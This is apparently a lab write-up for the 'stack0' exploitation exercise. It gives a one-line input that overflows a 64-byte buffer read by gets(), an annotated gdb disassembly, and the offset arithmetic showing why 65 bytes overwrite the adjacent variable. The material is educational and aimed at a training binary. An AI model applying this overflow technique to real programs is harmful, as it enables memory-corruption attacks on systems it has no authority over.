
Solution: python3 -c "print('A'*65)" | ./stack0

Analysis:


	1(main) :  Sets the the current stack ptr as the base ptr
	3(main) :  Moves ESP to a mod 16 bit 0 address
	6(main) :  Allocates 0x60 bytes on the stack 
	9(main) :  Places modified at the bottom of the stack
	17(main) : Saves the starting address of the buffer
	21(main) : Saves the addr onto the top of the stack
	24(main) : Calls gets
	29(main) : Moves modified into eax
	33(main) : makes sure modified is 0
	37(main) : This is our goal. 


	Because modified is at the bottom of the stack, we expect it to be overwritten by a buffer 
	larger than the allocated space for buffer[64]. The size of the allocation for buffer can be 
	calculated by subtracting the next stack value address after the buffer starting address, in our 
	case modified - buffer_addr = 0x5c - 0x1c = 64 bytes. Then we only need a 65 byte string to modify 
	modified which resides in 0x5c.


(gdb) disas main
Dump of assembler code for function main:
   0x080483f4 <+0>:     push   ebp
   0x080483f5 <+1>:     mov    ebp,esp
   0x080483f7 <+3>:     and    esp,0xfffffff0
   0x080483fa <+6>:     sub    esp,0x60
   0x080483fd <+9>:     mov    DWORD PTR [esp+0x5c],0x0
   0x08048405 <+17>:    lea    eax,[esp+0x1c]
   0x08048409 <+21>:    mov    DWORD PTR [esp],eax
   0x0804840c <+24>:    call   0x804830c <gets@plt>
   0x08048411 <+29>:    mov    eax,DWORD PTR [esp+0x5c]
   0x08048415 <+33>:    test   eax,eax
   0x08048417 <+35>:    je     0x8048427 <main+51>
   0x08048419 <+37>:    mov    DWORD PTR [esp],0x8048500
   0x08048420 <+44>:    call   0x804832c <puts@plt>
   0x08048425 <+49>:    jmp    0x8048433 <main+63>
   0x08048427 <+51>:    mov    DWORD PTR [esp],0x8048529
   0x0804842e <+58>:    call   0x804832c <puts@plt>
   0x08048433 <+63>:    leave  
   0x08048434 <+64>:    ret    
End of assembler dump.
 
	
	
